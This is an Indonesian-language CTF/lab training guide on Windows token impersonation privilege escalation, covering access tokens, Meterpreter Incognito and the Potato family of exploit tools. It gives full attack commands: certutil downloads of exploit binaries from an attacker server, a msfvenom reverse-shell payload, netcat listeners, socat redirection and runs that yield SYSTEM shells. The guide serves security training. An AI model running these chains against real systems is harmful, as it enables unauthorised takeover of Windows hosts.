---
id: "46"
title: "🎫 46 — Token Impersonation Workflow"
category: "5. Privilege Escalation"
categoryId: "privesc"
filename: "46_token_impersonation_workflow.md"
refs_out: ["05","12","35","36","37","41","42","43","44","45","47","64"]
refs_in: ["37","42","45","47"]
---

# 🎫 46 — Token Impersonation Workflow

> **Category:** Windows Privilege Escalation  
> **Difficulty:** Intermediate  
> **Type:** Token Abuse / Local Privilege Escalation  
> **Prerequisite:** Sudah memiliki shell/access pada Windows target  
> **Target:** Windows 7/8/10/11 dan Windows Server pada CTF/Lab  
> **Attacker:** Parrot OS XFCE  
> **Primary Goal:** Memahami dan mempraktikkan token impersonation sampai mendapatkan `NT AUTHORITY\SYSTEM`

---

# 🧭 BAGIAN 0 — FONDASI WINDOWS ACCESS TOKEN

## 0.1 🎫 Apa Itu Access Token?

Bayangkan Windows sebagai gedung yang memiliki banyak ruangan.

Setiap proses yang berjalan membawa semacam:

```text
"KARTU AKSES"
```

Kartu tersebut menentukan:

```text
Siapa saya?
Saya anggota group apa?
Saya punya privilege apa?
Seberapa tinggi trust saya?
Saya berada di session mana?
```

Dalam Windows, kartu ini disebut:

```text
ACCESS TOKEN
```

---

## 🪪 Struktur Access Token

```text
┌───────────────────────────────────────┐
│            ACCESS TOKEN               │
├───────────────────────────────────────┤
│ User SID                              │
│ S-1-5-21-xxxxxxxx-xxxxxxxx-xxxxxxxx   │
│                                       │
│ Group SIDs                            │
│ - Users                               │
│ - Administrators                      │
│ - SYSTEM-related groups               │
│                                       │
│ Privileges                            │
│ - SeImpersonatePrivilege              │
│ - SeDebugPrivilege                    │
│ - SeBackupPrivilege                   │
│                                       │
│ Integrity Level                       │
│ - Low / Medium / High / System       │
│                                       │
│ Session ID                            │
│ - Session 0 / Session 1 / etc.        │
└───────────────────────────────────────┘
```

---

## 👤 User SID

SID menentukan identitas security principal.

Contoh:

```text
S-1-5-21-111111111-222222222-333333333-1105
```

Artinya secara sederhana:

```text
SID
 ↓
Identitas security principal
```

Nama:

```text
alice
```

hanyalah representasi yang lebih mudah dibaca manusia.

Windows secara internal bekerja banyak menggunakan SID.

---

## 👥 Group SIDs

Token juga berisi group membership.

Misalnya:

```text
Alice
 ├── Users
 ├── Remote Desktop Users
 └── Administrators
```

Authorization check dapat mempertimbangkan group tersebut.

---

## 🛠️ Privileges

Privileges bukan group.

Contohnya:

```text
SeImpersonatePrivilege
SeDebugPrivilege
SeBackupPrivilege
SeRestorePrivilege
```

Privilege memberikan kemampuan khusus pada token.

---

## 📊 Integrity Level

Integrity Level adalah bagian dari mekanisme Mandatory Integrity Control.

Secara sederhana:

```text
LOW
 ↓
MEDIUM
 ↓
HIGH
 ↓
SYSTEM
```

Semakin tinggi biasanya semakin besar trust boundary yang dapat dilewati.

---

## 🧑‍💻 Session ID

Session memisahkan konteks interaktif / logon tertentu.

Contoh:

```text
Session 0
Session 1
Session 2
```

Hal ini menjadi penting saat bekerja dengan service, desktop, RDP, atau GUI.

---

# 0.2 🔑 Dua Jenis Token

Ada dua konsep yang wajib dipahami.

```text
PRIMARY TOKEN
IMPERSONATION TOKEN
```

---

## 🪪 Primary Token

Primary token umumnya melekat pada:

```text
PROCESS
```

dan menentukan security context utama proses tersebut.

Contoh:

```text
explorer.exe
    ↓
Alice's primary token
```

Ketika Alice menjalankan:

```text
cmd.exe
```

proses tersebut biasanya menggunakan primary token yang merepresentasikan security context Alice.

---

## 🎭 Impersonation Token

Impersonation token terutama digunakan pada:

```text
THREAD
```

untuk membuat thread bertindak atas nama security context client tertentu.

Contoh service:

```text
CLIENT
   │
   │ request
   ▼
SERVER THREAD
   │
   └── impersonate client
```

Artinya server sementara dapat melakukan operasi sebagai client.

---

# 0.2.1 🎚️ Impersonation Levels

Windows mengenal beberapa level:

```text
Anonymous
Identification
Impersonation
Delegation
```

### Anonymous

Analogi:

```text
Orang datang memakai hoodie
dan tidak memberi tahu identitas.
```

Server mengetahui ada koneksi, tetapi identitas usable sangat terbatas.

---

### Identification

Analogi:

```text
Satpam melihat KTP kamu,
tetapi tidak menyerahkan kartu aksesmu.
```

Server dapat mengetahui siapa client, tetapi kemampuan bertindak atas nama client lebih terbatas.

---

### Impersonation

Analogi:

```text
Satpam diberi akses sementara
untuk masuk ke ruangan yang boleh dimasuki client.
```

Inilah level yang paling relevan untuk banyak abuse scenario.

---

### Delegation

Analogi:

```text
Satpam tidak hanya boleh masuk
atas nama kamu di gedung ini,
tetapi dipercaya mewakili kamu
untuk akses ke gedung lain.
```

Delegation memiliki trust boundary lebih besar.

---

# 0.2.2 📋 Primary vs Impersonation Token

|Aspek|Primary Token|Impersonation Token|
|---|---|---|
|Umumnya melekat pada|Process|Thread|
|Fungsi|Security context utama|Bertindak atas nama client|
|Contoh|`cmd.exe` milik user|Server thread impersonating client|
|Bisa diduplikasi|Ya|Ya|
|Penting untuk PrivEsc|Bisa|Sangat penting|
|Kata kunci|Process context|Thread/client context|

---

# 0.3 🛡️ Windows Privileges yang Relevan

|Privilege|Nama Teknis|Arti|Relevansi|
|---|---|---|---|
|Impersonate|`SeImpersonatePrivilege`|Mengizinkan impersonation dalam kondisi yang memenuhi aturan Windows|🔥 Critical|
|Assign Primary Token|`SeAssignPrimaryTokenPrivilege`|Memungkinkan penggantian primary token dalam skenario tertentu|🔥 High|
|Increase Quota|`SeIncreaseQuotaPrivilege`|Mengubah process quota tertentu|🟠 Medium|
|Debug|`SeDebugPrivilege`|Membuka process di luar security context sendiri pada kondisi tertentu|🔥 High|
|Load Driver|`SeLoadDriverPrivilege`|Memuat driver|☠️ Critical|
|Backup|`SeBackupPrivilege`|Membaca data dengan backup semantics tertentu|🔥 High|
|Restore|`SeRestorePrivilege`|Menulis/mengembalikan data dengan restore semantics|🔥 High|
|Shutdown|`SeShutdownPrivilege`|Shutdown sistem|🟢 Low untuk PrivEsc|
|Take Ownership|`SeTakeOwnershipPrivilege`|Mengambil ownership object tertentu|🟠 High|

### ⭐ Privilege paling penting di workflow ini

```text
SeImpersonatePrivilege
```

Kenapa?

Karena service account tertentu memang diberikan privilege ini untuk mendukung model server/client Windows.

Dalam CTF:

```text
web shell
   ↓
service account
   ↓
whoami /priv
   ↓
SeImpersonatePrivilege
   ↓
Potato-family / named-pipe abuse
   ↓
SYSTEM
```

Sumber riset PrintSpoofer menjelaskan bahwa `SeImpersonatePrivilege` adalah prerequisite inti untuk teknik tersebut, dan service seperti `LOCAL SERVICE` dapat memilikinya.

---

# 0.4 🧱 Integrity Levels

```text
SYSTEM
  │
  ▼
HIGH
  │
  ▼
MEDIUM
  │
  ▼
LOW
```

Contoh umum:

```text
Low
→ sandboxed/restricted application

Medium
→ normal user process

High
→ elevated administrator process

System
→ SYSTEM security context
```

### ⚠️ Koreksi konsep penting

`SYSTEM` adalah **account/security principal**, sedangkan:

```text
System Integrity Level
```

adalah bagian berbeda dari token.

Keduanya sering muncul bersamaan sehingga pemula mudah menganggap:

```text
"SYSTEM = sebuah Integrity Level"
```

lebih tepat:

```text
NT AUTHORITY\SYSTEM
+
System Integrity Level
```

---

# 0.5 👥 Siapa yang Sering Memiliki SeImpersonatePrivilege?

|Account / Context|Sering punya?|Kenapa menarik|
|---|--:|---|
|`NT AUTHORITY\SYSTEM`|✅|Security context tertinggi|
|Local Administrator|✅/sering|Admin dapat berbagai privilege|
|IIS AppPool|✅/sering|Web service menjalankan request|
|SQL Server service|✅/sering|Service account|
|Network Service|✅/sering|Service/network operations|
|Local Service|✅/sering|Windows service context|
|Custom service account|Tergantung|Bergantung service configuration|
|Normal local user|Biasanya tidak|Tidak dibutuhkan secara normal|

PrintSpoofer sendiri mendokumentasikan skenario service account seperti `LOCAL SERVICE` atau `NETWORK SERVICE` yang memiliki `SeImpersonatePrivilege`.

### 🧠 Mental model

Saat mendapatkan:

```text
iis apppool\defaultapppool
```

jangan langsung berpikir:

```text
"Ah, cuma IIS."
```

Pikir:

```text
whoami
   ↓
whoami /priv
   ↓
SeImpersonate?
   ↓
YES?
   ↓
Potato family candidate
```

---

# 🔍 BAGIAN 1 — CEK TOKEN & PRIVILEGES

# 1.1 🧪 Cek Privileges Saat Ini

## CMD

```cmd
:: Tampilkan privilege token saat ini
whoami /priv
```

## Semua informasi

```cmd
:: Tampilkan token, SID, groups, privileges, dll
whoami /all
```

## Groups

```cmd
:: Tampilkan group membership
whoami /groups
```

## Cari SeImpersonate

```cmd
:: Cari privilege impersonation
whoami /priv | findstr /i "SeImpersonate"
```

## Cari integrity

```cmd
:: Cari integrity label
whoami /groups | findstr /i "Mandatory Label"
```

---

# 1.1.1 📋 Contoh Output Nyata

```text
C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeChangeNotifyPrivilege      Bypass traverse checking                  Enabled
SeImpersonatePrivilege       Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege      Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege
                             Increase a process working set            Disabled
```

Perhatikan:

```text
SeImpersonatePrivilege
        │
        ▼
Enabled
```

Itu red flag besar dalam CTF.

---

# 1.1.2 🟡 Disabled vs Enabled

Ini bagian yang sering membuat pemula salah.

Misalnya:

```text
SeImpersonatePrivilege    Disabled
```

berarti privilege:

```text
ADA DALAM TOKEN
```

tetapi:

```text
belum berada dalam state enabled untuk penggunaan saat itu
```

Itu **berbeda** dengan:

```text
privilege tidak ada sama sekali
```

### Jadi:

```text
Privilege absent
=
tidak tersedia pada token
```

sementara:

```text
Privilege present + Disabled
=
tersedia pada token, tetapi belum aktif
```

Aplikasi yang memiliki hak yang diperlukan dapat mencoba meng-enable privilege tersebut menggunakan mekanisme Windows yang sesuai.

Karena itu:

```text
SeImpersonatePrivilege Disabled
```

**bukan alasan untuk langsung menyerah.**

Tetapi juga jangan menganggap:

```text
Disabled = pasti exploit berhasil
```

Tetap validasi dengan tool/teknik yang digunakan.

---

# 1.1.3 🚨 Red Flag Utama

Prioritas:

```text
🔥 SeImpersonatePrivilege
🔥 SeAssignPrimaryTokenPrivilege
🔥 SeDebugPrivilege
🔥 SeBackupPrivilege
🔥 SeRestorePrivilege
🔥 SeTakeOwnershipPrivilege
```

---

# 1.2 🧰 Enumerate Token dengan Tools

# A. Meterpreter / Incognito

Jika sudah punya Meterpreter:

```text
meterpreter
   ↓
incognito
   ↓
token enumeration
```

Load extension:

```text
meterpreter > load incognito
```

List user tokens:

```text
meterpreter > list_tokens -u
```

List group tokens:

```text
meterpreter > list_tokens -g
```

---

## Contoh output

```text
Delegation Tokens Available
========================================
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM

Impersonation Tokens Available
========================================
VICTIM\alice
NT AUTHORITY\ANONYMOUS LOGON
```

### Interpretasi

```text
Delegation token
=
token yang tersedia untuk delegation-style use

Impersonation token
=
token yang tersedia dalam konteks impersonation
```

---

# 1.2.1 🎭 Impersonate Token

```text
meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
```

Kemudian:

```text
meterpreter > getuid
```

Output:

```text
Server username: NT AUTHORITY\SYSTEM
```

---

# 1.2.2 ⚠️ Token Enumeration ≠ Potato

Ini penting.

```text
Incognito
=
enumerate/use available tokens
```

sedangkan:

```text
PrintSpoofer
GodPotato
JuicyPotato
RoguePotato
=
create a situation to obtain/impersonate a more privileged token
```

Jangan campur keduanya.

---

# 1.3 🌳 Decision Tree Privilege

```text
[DAPAT SHELL / ACCESS]
          │
          ▼
     [whoami /priv]
          │
    ┌─────┼───────────────┐
    │     │               │
    ▼     ▼               ▼
SeImp? SeAssign?       SeDebug?
    │     │               │
   YES   YES             YES
    │     │               │
    ▼     ▼               ▼
 POTATO  TOKEN          DEBUG
 FAMILY  ABUSE          ABUSE
    │     │               │
    └─────┴──────┬────────┘
                  │
                  ▼
          [SeBackup / Restore?]
                  │
                  ▼
             FILE / SAM /
             NTDS PATH
                  │
                  ▼
          [SeTakeOwnership?]
                  │
                  ▼
            OWNERSHIP ABUSE
                  │
                  ▼
          [SeLoadDriver?]
                  │
                  ▼
          DRIVER TECHNIQUES
                  │
                  ▼
         [NO USEFUL PRIVILEGE]
                  │
                  ▼
        RETURN TO FILE 45
        WINDOWS PRIVESC
```

---

# 🥔 BAGIAN 2 — MEMAHAMI POTATO FAMILY

# 2.0 🥔 Kenapa Disebut "Potato"?

Istilah Potato menjadi populer karena rangkaian exploit privilege escalation yang memakai impersonation/token-abuse ideas.

Timeline simplifikasi:

```text
2016
 │
 ├── Hot Potato
 │
 └── Rotten Potato
 │
 ▼
2018
 │
 └── JuicyPotato
 │
 ▼
2020
 │
 ├── RoguePotato
 └── PrintSpoofer
 │
 ▼
2020+
 │
 └── berbagai varian / teknik lanjutan
 │
 ▼
2023+
 │
 └── GodPotato dan tool lain
```

### ⚠️ Jangan menghafal timeline sebagai:

```text
tool baru = selalu lebih bagus
```

Tool dipilih berdasarkan:

```text
Windows build
+
service availability
+
privilege
+
architecture
+
network constraints
+
execution context
```

JuicyPotato diketahui tidak lagi bekerja pada Windows 10 1809 dan Windows Server 2019 karena perubahan yang memengaruhi teknik tersebut.

---

# 2.1 🧠 Cara Kerja Umum Potato Attack

Core idea:

```text
Kita memiliki:
SeImpersonatePrivilege

Windows memiliki:
SYSTEM services

Target:
Membuat SYSTEM melakukan authentication/
connection ke resource yang kita kontrol
```

Secara konseptual:

```text
[ATTACKER PROCESS]
SeImpersonatePrivilege
        │
        ▼
[CREATE SERVER / PIPE / RPC CONTEXT]
        │
        ▼
[TRICK PRIVILEGED CLIENT]
        │
        ▼
[SYSTEM CONNECTS]
        │
        ▼
[CAPTURE / IMPERSONATE TOKEN]
        │
        ▼
[CREATE PROCESS UNDER TOKEN]
        │
        ▼
[SYSTEM]
```

---

# 2.1.1 🔌 Named Pipe Concept

Windows named pipe:

```text
\\.\pipe\example
```

dapat digunakan sebagai IPC mechanism.

Server:

```text
CREATE PIPE
     │
     ▼
WAIT CLIENT
```

Client:

```text
CONNECT PIPE
     │
     ▼
SEND DATA
```

Server yang memenuhi kondisi tertentu dapat memanggil API seperti:

```text
ImpersonateNamedPipeClient()
```

untuk bertindak dalam security context client.

PrintSpoofer research menjelaskan kombinasi named pipe impersonation dan pemicu koneksi privileged sebagai inti tekniknya.

---

# 🥔 BAGIAN 3 — JUICYPOTATO

# 3.1 🕰️ Kapan Dipakai?

JuicyPotato terutama relevan untuk host lama.

Secara umum:

```text
Windows 7
Windows 8 / 8.1
Windows Server 2008 R2
Windows Server 2012 / 2012 R2
Windows Server 2016
Windows 10 sebelum 1809
```

Sementara:

```text
Windows 10 1809+
Windows Server 2019+
```

adalah red flag untuk JuicyPotato compatibility.

### Requirement

```text
SeImpersonatePrivilege
atau
SeAssignPrimaryTokenPrivilege
```

tetapi actual exploitability juga bergantung pada environment.

---

# 3.2 📦 Download & Upload

Attacker:

```bash
# Download JuicyPotato dari repository/tool storage
wget https://github.com/ohpe/juicy-potato/releases/latest/download/JuicyPotato.exe
```

Cari local copy:

```bash
# Cari binary jika sudah pernah disimpan
find /opt /usr/share /home -iname "JuicyPotato*" 2>/dev/null
```

HTTP server:

```bash
# Serve tool dari attacker
cd /path/to/tools
python3 -m http.server 8000
```

Target:

```cmd
:: Download menggunakan certutil
certutil -urlcache -split -f http://PARROT_IP:8000/JuicyPotato.exe C:\Windows\Temp\JP.exe
```

---

# 3.2.1 🔄 Alternatif PowerShell

```powershell
# Download binary
Invoke-WebRequest `
  -Uri "http://PARROT_IP:8000/JuicyPotato.exe" `
  -OutFile "C:\Windows\Temp\JP.exe"
```

---

# 3.3 🧩 Memilih CLSID

CLSID:

```text
Class ID
```

adalah identifier unik untuk COM class.

Dalam konteks JuicyPotato:

```text
CLSID
 ↓
COM object
 ↓
service/account
 ↓
potential token source
```

### ⚠️ Sangat penting

CLSID bukan:

```text
"magic number"
```

Satu CLSID dapat:

```text
works on one build
fails on another
```

Repository JuicyPotato menyediakan database CLSID berdasarkan Windows environment; misalnya daftar Windows 10 Enterprise menunjukkan CLSID dan account/service terkait.

---

# 3.3.1 🔍 Identifikasi OS

```cmd
:: Nama OS
systeminfo | findstr /i "OS Name"

:: Versi OS
systeminfo | findstr /i "OS Version"

:: Architecture
echo %PROCESSOR_ARCHITECTURE%
```

Contoh:

```text
OS Name:                   Microsoft Windows Server 2016 Standard
OS Version:                10.0.14393 N/A Build 14393
System Type:               x64-based PC
```

---

# 3.3.2 📋 CLSID Example

Contoh historis yang sering ditemukan pada database JuicyPotato:

|Environment|Example CLSID|Notes|
|---|---|---|
|Windows 7|`{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}`|Historis|
|Server 2012|`{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}`|Historis|
|Windows 10 pre-1809|`{e60687f7-01a1-40aa-86ac-db1cbf673334}`|Historis|
|Server 2016|`{e60687f7-01a1-40aa-86ac-db1cbf673334}`|Historis|

**Validasi terhadap repository/database yang cocok dengan build target sebelum penggunaan.** Jangan menganggap satu tabel lama berlaku untuk setiap patch level.

---

## Generate Payload Reverse Shell (Prerequisite)
```bash
# ============================================
# CARA BUAT PAYLOAD REVERSE SHELL
# Jalankan di Parrot OS sebelum mulai exploit
# ============================================

export PARROT_IP="10.10.14.X"   # IP Parrot OS kamu
export LPORT="4444"              # Port listener kamu

msfvenom \
  -p windows/x64/shell_reverse_tcp \
  LHOST=$PARROT_IP \
  LPORT=$LPORT \
  -f exe \
  -o shell.exe

ls -la shell.exe
python3 -m http.server 8000
```
# 3.4 💥 JuicyPotato Step-by-Step

## Step 1 — Listener

Attacker:

```bash
# Listener
rlwrap nc -lvnp 4444
```

---

## Step 2 — Payload

Misalnya kita sudah memiliki:

```text
C:\Windows\Temp\shell.exe
```

yang dibuat khusus untuk lab.

---

## Step 3 — Run JuicyPotato

Target:

```cmd
:: Jalankan JuicyPotato
:: -l = COM server local port
:: -p = program yang ingin dijalankan
:: -t = process creation mode
:: -c = CLSID

C:\Windows\Temp\JP.exe -l 1337 -p C:\Windows\Temp\shell.exe -t * -c {CLSID}
```

---

## Breakdown

```text
-l 1337
   ↓
local COM listening port

-p shell.exe
   ↓
program yang akan dijalankan

-t *
   ↓
coba process creation method yang tersedia

-c {CLSID}
   ↓
COM class identifier
```

---

# 3.4.1 📟 Contoh Output

```text
Testing {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} 1337
......
[+] authresult 0
{9B1F122C-2982-4e91-AA8B-E071D54F2A4D};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

[+] enjoy :)
```

Listener:

```text
connect to [PARROT_IP] from (UNKNOWN) [TARGET_IP] 49876

Microsoft Windows [Version 10.0.14393]

C:\Windows\system32>whoami
nt authority\system
```

---

# 3.5 🧰 Payload Alternatives

Jangan selalu memakai reverse shell.

Dalam CTF lebih aman untuk memvalidasi privilege menggunakan command sederhana:

```cmd
:: Jalankan whoami dan redirect output
C:\Windows\Temp\JP.exe ^
  -l 1337 ^
  -p C:\Windows\System32\cmd.exe ^
  -a "/c whoami > C:\Windows\Temp\who.txt" ^
  -t * ^
  -c {CLSID}
```

Cek:

```cmd
:: Baca hasil
type C:\Windows\Temp\who.txt
```

Expected:

```text
nt authority\system
```

### Kenapa metode ini bagus?

Karena:

```text
Tidak perlu reverse shell
Tidak tergantung listener
Tidak tergantung outbound firewall
Lebih mudah debugging
```

---

# 3.6 🧯 Troubleshooting JuicyPotato

|Error|Kemungkinan penyebab|Tindakan|
|---|---|---|
|COM server failed|CLSID tidak cocok|Validasi CLSID berdasarkan target|
|`authresult -1`|Authentication/token path gagal|Coba CLSID/mode lain|
|`recv failed`|Windows build tidak cocok / COM path gagal|Periksa build dan teknik|
|Access denied|Context/permission|Verifikasi privilege dan location|
|Program tidak jalan|Payload/path salah|Gunakan `whoami > file` untuk test|
|Tidak ada koneksi|Firewall / wrong LHOST/LPORT|Test connectivity|
|Tool exit tanpa hasil|Compatibility issue|Gunakan PrintSpoofer/GodPotato|
|1809+/Server 2019|JuicyPotato limitation|Pilih teknik modern|

---

# 🖨️ BAGIAN 4 — PRINTSPOOFER

# 4.1 🎯 Kapan Dipakai?

PrintSpoofer dibuat untuk memanfaatkan `SeImpersonatePrivilege` melalui Print Spooler/named-pipe related technique.

Research asli menyebut PrintSpoofer berhasil diuji pada:

```text
Windows 8.1
Windows Server 2012 R2
Windows 10
Windows Server 2019
```

dengan prerequisite `SeImpersonatePrivilege`.

### Penting

Jangan menyimpulkan:

```text
"PrintSpoofer = semua Windows modern"
```

Keberhasilan tetap bergantung pada:

```text
OS build
service state
privilege
execution context
tool behavior
```

Repository asli PrintSpoofer kini telah diarsipkan, jadi gunakan source/tool provenance yang jelas dalam lab dan dokumentasikan hash/version binary yang digunakan.

---

# 4.2 📦 Download

Attacker:

```bash
# Download tool untuk lab
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe \
  -O PrintSpoofer64.exe
```

Serve:

```bash
# HTTP server
python3 -m http.server 8000
```

Target:

```cmd
:: Download
certutil -urlcache -split -f ^
  http://PARROT_IP:8000/PrintSpoofer64.exe ^
  C:\Windows\Temp\PS.exe
```

---

# 4.3 💥 Interactive Shell
## Verify Print Spooler Service Before Using PrintSpoofer
```cmd
sc query spooler
```
If the service state is **STOPPED**, PrintSpoofer will likely fail. Start it with:
```cmd
sc start spooler
```
# 4.3 💥 Interactive Shell

```cmd
:: Jalankan interactive SYSTEM shell
C:\Windows\Temp\PS.exe -i -c cmd
```

Concept:

```text
-i
 ↓
interactive console

-c cmd
 ↓
command yang dijalankan
```

Expected:

```text
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
```

Kemudian:

```cmd
:: Verify
whoami
```

Output:

```text
nt authority\system
```

PrintSpoofer research menunjukkan penggunaan `CreateProcessAsUser`/`CreateProcessWithToken` setelah impersonation token diperoleh.

---

# 4.3.1 🔌 Non-Interactive Command

```cmd
:: Jalankan command dan simpan hasil
C:\Windows\Temp\PS.exe ^
  -c "cmd.exe /c whoami > C:\Windows\Temp\result.txt"
```

Kemudian:

```cmd
:: Baca hasil
type C:\Windows\Temp\result.txt
```

---

# 4.4 📊 JuicyPotato vs PrintSpoofer

|Aspek|JuicyPotato|PrintSpoofer|
|---|---|---|
|Core idea|COM/DCOM token abuse|Named pipe + Print Spooler related abuse|
|`SeImpersonate`|✅|✅|
|CLSID|✅ diperlukan|❌|
|Windows lama|Sangat relevan|Bisa relevan|
|Windows 10 1809+|❌ umumnya tidak|✅ candidate|
|Server 2019|❌|✅ candidate|
|Print Spooler dependency|❌|✅|
|Interactive mode|Tersedia dengan opsi tertentu|`-i`|
|Debugging|CLSID-heavy|Relatif sederhana|
|Reliability|Environment-dependent|Environment-dependent|

Sumber asli JuicyPotato menunjukkan masalah pada Windows 10 1809; PrintSpoofer kemudian digunakan untuk skenario modern seperti Server 2019.

---

# 🥷 BAGIAN 5 — ROGUE POTATO

# 5.1 🧠 Kapan Dipakai?

RoguePotato merupakan alternatif pada environment yang:

```text
SeImpersonatePrivilege
+
JuicyPotato tidak cocok
```

Konsepnya berkaitan dengan:

```text
OXID resolver
+
RPC
+
token impersonation
```

---

# 5.2 📦 Setup

Attacker:

```bash
# Install socat jika belum ada
sudo apt install socat
```

Download tool dari source yang sudah Anda audit.

Serve:

```bash
# HTTP server
python3 -m http.server 8000
```

Target:

```cmd
:: Download binary
certutil -urlcache -split -f ^
  http://PARROT_IP:8000/RoguePotato.exe ^
  C:\Windows\Temp\RoguePotato.exe
```

---

# 5.3 🔀 Port Redirection Concept
### RoguePotato – Correct `socat` Usage
```bash
# ============================================
# ROGUETPOTATO — URUTAN YANG BENAR
# ============================================

# Concept: RoguePotato on the victim will try to connect to port 135 (DCOM/RPC).
# We redirect that traffic to our listener.

# $TARGET = IP VICTIM (the machine being attacked)

# Terminal 1 (Parrot) – Setup socat redirect
sudo socat \
  TCP-LISTEN:135,reuseaddr,fork \
  TCP:$TARGET:9999

# Terminal 2 (Parrot) – Listener for shell
nc -nlvp 4444

# Terminal 3 (Target Windows) – Run RoguePotato
./RoguePotato.exe -r $PARROT_IP -e "C:\\path\\to\\shell.exe" -l 9999
```

RoguePotato dapat membutuhkan external redirector/relay sesuai mode yang digunakan.

Concept:

```text
SYSTEM
  │
  ▼
RPC / OXID
  │
  ▼
ATTACKER
  │
  ▼
redirect
  │
  ▼
RoguePotato
```

Contoh lab:

```bash
# Redirector contoh
sudo socat \
  TCP-LISTEN:135,reuseaddr,fork \
  TCP:$TARGET:9999
```

Listener:

```bash
# Listener
nc -lvnp 4444
```

---

# 5.4 ⚠️ Kenapa RoguePotato Lebih Rumit?

Karena ada lebih banyak moving parts:

```text
Victim
+
RPC
+
Port 135
+
Redirector
+
Local listener
+
Payload
```

Satu kesalahan dapat menghasilkan:

```text
timeout
RPC error
no token
no shell
```

Karena itu gunakan:

```text
PrintSpoofer
```

atau tool lain terlebih dahulu apabila cocok dengan host.

---

# 👑 BAGIAN 6 — GODPOTATO

# 6.1 👑 Kenapa GodPotato Menarik?

GodPotato adalah salah satu tool yang sering dipakai dalam CTF untuk abuse `SeImpersonatePrivilege`.

Project tersebut mendeskripsikan tekniknya sebagai privilege escalation pada Windows Server 2012–2022 dan Windows 8–11 dalam kondisi yang sesuai.

### ⚠️ Jangan gunakan kalimat absolut:

```text
"GodPotato works on all Windows versions."
```

Lebih benar:

```text
"GodPotato memiliki coverage luas pada
berbagai versi Windows, tetapi hasil tetap
bergantung pada build, .NET/runtime,
privilege, mitigations, dan execution context."
```

---

# 6.2 📦 Download & Upload

Attacker:

```bash
# Download versi yang sesuai dari project/release
wget https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET4.exe \
  -O GodPotato-NET4.exe
```

Serve:

```bash
# HTTP server
python3 -m http.server 8000
```

Target:

```cmd
:: Download
certutil -urlcache -split -f ^
  http://PARROT_IP:8000/GodPotato-NET4.exe ^
  C:\Windows\Temp\gp.exe
```

Verify:

```cmd
:: Pastikan file ada
dir C:\Windows\Temp\gp.exe
```

---

# 6.3 🔍 Cek Environment Dulu

Sebelum menjalankan GodPotato:

```cmd
:: Identity
whoami

:: Token privileges
whoami /priv

:: OS information
systeminfo | findstr /i "OS Name"

:: OS version
systeminfo | findstr /i "OS Version"

:: Architecture
echo %PROCESSOR_ARCHITECTURE%
```

Expected discovery:

```text
whoami
→ NT AUTHORITY\LOCAL SERVICE

whoami /priv
→ SeImpersonatePrivilege

OS
→ Windows Server 2019

Architecture
→ AMD64
```

---

# 6.4 💥 GodPotato Basic Validation

Daripada langsung reverse shell, validasi dulu:

```cmd
:: Jalankan whoami sebagai elevated context
C:\Windows\Temp\gp.exe -cmd "cmd /c whoami"
```

Expected:

```text
nt authority\system
```

Ini merupakan test terbaik untuk:

```text
Does token impersonation work?
```

tanpa melibatkan network.

---

# 6.4.1 🔥 GodPotato → Shell

Jika validasi berhasil dan payload sudah disiapkan:

```cmd
:: Jalankan local shell payload
C:\Windows\Temp\gp.exe -cmd "C:\Windows\Temp\shell.exe"
```

---

# 6.4.2 📄 Output File Validation

Jika reverse shell sulit:

```cmd
:: Redirect output
C:\Windows\Temp\gp.exe ^
  -cmd "cmd /c whoami > C:\Windows\Temp\gp-result.txt"
```

Kemudian:

```cmd
:: Baca output
type C:\Windows\Temp\gp-result.txt
```

Expected:

```text
nt authority\system
```

---

# 6.5 🧬 GodPotato dan .NET

GodPotato menyediakan build untuk runtime .NET berbeda.

Contoh nama:

```text
GodPotato-NET2.exe
GodPotato-NET35.exe
GodPotato-NET4.exe
```

Cek environment:

```cmd
:: Query installed .NET Framework
reg query ^
  "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP" ^
  /s ^
  /v version
```

Alternative:

```cmd
:: Lihat framework directories
dir C:\Windows\Microsoft.NET\Framework\
```

---

# 6.5.1 📋 Runtime Mapping

|Binary|Typical Runtime Target|
|---|---|
|`GodPotato-NET2.exe`|.NET 2.0/CLR generation|
|`GodPotato-NET35.exe`|.NET 3.5|
|`GodPotato-NET4.exe`|.NET 4.x|

### Rule

```text
Jangan:
"NET4 pasti terbaik."

Lakukan:
Cek runtime target
↓
Pilih binary compatible
↓
Test
```

Issue tracker project masih menunjukkan adanya runtime-specific questions/bugs, jadi nama file tidak boleh dianggap sebagai jaminan kompatibilitas universal.

---

# 6.6 🧠 Apa yang Sebenarnya Dilakukan GodPotato?

Mental model:

```text
Low-priv service account
        │
        │ has SeImpersonatePrivilege
        ▼
GodPotato
        │
        ├── create/control IPC context
        │
        ├── trigger privileged authentication
        │
        ├── obtain usable token context
        │
        └── create process under elevated token
                    │
                    ▼
              SYSTEM process
```

Jadi:

```text
GodPotato
```

bukan:

```text
"tool yang langsung memberikan root"
```

melainkan sebuah implementasi untuk memanfaatkan trust/impersonation mechanism Windows.

---

# 🍠 BAGIAN 7 — SWEETPOTATO

# 7.1 🧰 Kapan Dipakai?

SweetPotato menggabungkan beberapa primitive/technique sehingga sering dianggap sebagai:

```text
multi-technique potato framework
```

Gunakan ketika:

```text
SeImpersonate ada
+
tool lain kurang cocok
```

---

# 7.2 💥 Command Dasar

Contoh konsep:

```cmd
:: Gunakan teknik EfsRpc
C:\Windows\Temp\SweetPotato.exe ^
  -e EfsRpc ^
  -p C:\Windows\System32\cmd.exe ^
  -a "/c whoami > C:\Windows\Temp\sweet.txt"
```

Baca hasil:

```cmd
:: Verify
type C:\Windows\Temp\sweet.txt
```

Expected:

```text
nt authority\system
```

---

# 🎭 BAGIAN 8 — METERPRETER INCOGNITO

# 8.1 🧠 Kapan Digunakan?

Incognito berbeda dari Potato.

```text
Potato
=
mencari cara memperoleh token privileged

